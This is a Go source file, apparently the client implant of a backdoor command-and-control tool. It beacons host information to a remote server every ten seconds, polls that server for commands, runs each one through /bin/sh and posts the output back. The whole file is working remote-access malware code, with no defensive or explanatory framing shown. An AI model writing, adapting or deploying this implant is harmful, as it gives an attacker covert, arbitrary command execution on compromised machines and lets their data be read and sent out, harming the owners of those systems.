package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/zhangweijie11/zSec/backdoor/command_control/client/models"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strings"
	"time"
)

var ValidAgent *models.Agent

type Command struct {
	Id         int64     `json:"id"`
	AgentId    string    `json:"agent_id"`
	Content    string    `json:"content"`
	Status     int       `json:"status"`
	CreateTime time.Time `xorm:"created"`
	UpdateTime time.Time `xorm:"updated"`
}

func Ping() {
	agentInfo := ValidAgent.ParseInfo()
	data, _ := json.Marshal(agentInfo)

	url := fmt.Sprintf("%v/ping", ValidAgent.URL)
	beat := time.Tick(10 * time.Second)
	for range beat {
		req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
		resp, err := ValidAgent.Client.Do(req)
		if err == nil {
			_ = resp.Body.Close()
		}
	}
}

func ExecCommand() {
	fmt.Println("展示agent: ", ValidAgent)
	url := fmt.Sprintf("%v/cmd/%v", ValidAgent.URL, ValidAgent.AgentId)

	beat := time.Tick(10 * time.Second)
	for range beat {
		req, err := http.NewRequest("POST", url, nil)
		resp, err := ValidAgent.Client.Do(req)
		if err == nil {
			r, err := io.ReadAll(resp.Body)
			if err == nil {
				cmds := make([]Command, 0)
				err = json.Unmarshal(r, &cmds)
				for _, cmd := range cmds {
					ret, err := execCmd(cmd.Content)
					fmt.Println("执行命令结束！", cmd, ret, err)
					_ = submitCmd(cmd.Id, ret)
				}
				_ = resp.Body.Close()
			}
		}
	}
}
func execCmd(command string) (string, error) {
	Cmd := exec.Command("/bin/sh", "-c", command)
	retCmd, err := Cmd.CombinedOutput() // 运行命令，返回结果
	retString := string(retCmd)
	return retString, err
}

func submitCmd(id int64, result string) error {
	urlCmd := fmt.Sprintf("%v/send_result/%v", ValidAgent.URL, id)
	data := url.Values{}
	data.Add("result", result)
	body := strings.NewReader(data.Encode())

	req, err := http.NewRequest("POST", urlCmd, body)
	if err != nil {
		return err
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	resp, err := ValidAgent.Client.Do(req)
	if err != nil {
		return err
	}
	err = resp.Body.Close()
	return err
}

func main() {
	debug := true
	agent, err := models.NewAgent(debug, "http")
	if err != nil {
		os.Exit(0)
	}

	ValidAgent = agent
	go Ping()
	ExecCommand()
}
